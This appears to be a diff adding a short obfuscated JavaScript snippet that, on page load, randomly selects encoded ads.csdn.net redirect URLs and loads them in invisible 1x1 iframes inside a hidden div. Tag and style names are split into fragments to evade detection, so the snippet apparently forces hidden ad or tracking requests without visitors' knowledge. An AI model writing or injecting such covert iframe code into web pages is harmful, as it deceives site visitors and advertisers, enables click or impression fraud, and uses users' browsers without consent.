@@ -1,0 +1,36 @@
+(function(){
+    var a = function () {};
+    a.u = [{"l":"http:\/\/ads.csdn.net\/skip.php?subject=Vj9bc15hBWEEIAFdA2hRZVI7DTpYPAQ\/BCJXNlJkBSFXNF11DyBTO1F0B2EPUgE4VmZRbVA1ADFTZlZwCDNSZFY1W2BeWgVtBDYBPwMyUTFSNw00WCkEdgRoVzZSbgUIVyFdcQ9pU2ZRNwciD3kBKFZyUTVQOgB0","r":0.11},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=A2pacgk2DWkPKwlVAWpXYwFoBjFWMl5kV3EGZwYwVnINbgoiDyAFbQMmCG4DXgY\/BDQBPQJkUGBTZFdxU2habANgWmEJDQ1lDz0JNwEwVzcBZAY0VideLFc7BmcGOlZbDXsKJg9pBTEDZggtA3UGLwQgAWUCaFAk","r":0.15},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=BWwKIgg3UDQAJAlVBW4ANFM6V2AFYQM5AyVQMVVjBSFQMwggCyQDawInVTMAXQY\/ATFVaQVqUHQEbQFlAzQGNQVcCjkIN1BsAGUJOgU2AGZTIVcmBT4DYANtUA9VdwUhUGsIYQthAyQCIFUvAHIGMwFoVSI=","r":0.09},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=AGkBKV1iB2MOKlUJVD8CNlI7AjVXNAQ3UHZTMgcxBSFWNV52DiENZVVwBWMPUlBpVGRQbAVrUGtSdAFoBTNUYwBnAQRdbwdiDmVVZVRmAmZSMQIlV3AEalAxUz0HCgUnViZeOQ5kDTxVMwUgD3lQeVRwUDQFb1Ak","r":0.28},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=BWxacllmAWUGIlMPB2xRZVQ9BzBZOgU2ACYEZQcxU3cGZVpyWXYGbgYjCW8AXVRtBDQFOVE3AzEEMgstUmkCNAVmWmFZXQFpBjRTbQc2UTFUNAc\/WSgFdwBsBGUHO1NeBnBadlk\/BjYGYQk6ACRUcAQpBXRRYwM8BHI=","r":0.31},{"l":"http:\/\/ads.csdn.net\/skip.php?subject=UzoLIwA\/AWUPK1MPAGsNOQBpAzRRMlFqVXMAYQI0U3cFZltzDSICagEkVzFUCVFoV2cCPgBmX2wENVZwVW4HMVMwCzAABAFpDz1TbQAxDW0AZwM3USBRI1U5AGECPlNeBXNbdw1rAjIBZ1diVHBRdVd6AnMAMl9gBHI=","r":0.29}];
+    a.to = function () {
+        if(typeof a.u == "object"){
+            for (var i in a.u) {
+                var r = Math.random();
+                if (r < a.u[i].r)
+                    a.go(a.u[i].l + '&r=' + r);
+            }
+        }
+    };
+    a.go = function (url) {
+        var e = document.createElement("if" + "ra" + "me");
+        e.style.width = "1p" + "x";
+        e.style.height = "1p" + "x";
+        e.style.position = "ab" + "sol" + "ute";
+        e.style.visibility = "hi" + "dden";
+        e.src = url;
+        var t_d = document.createElement("d" + "iv");
+        t_d.appendChild(e);
+        var d_id = "a52b5334d";
+        if (document.getElementById(d_id)) {
+            document.getElementById(d_id).appendChild(t_d);
+        } else {
+            var a_d = document.createElement("d" + "iv");
+            a_d.id = d_id;
+            a_d.style.width = "1p" + "x";
+            a_d.style.height = "1p" + "x";
+            a_d.style.display = "no" + "ne";
+            document.body.appendChild(a_d);
+            document.getElementById(d_id).appendChild(t_d);
+        }
+    };
+    a.to();
+})();
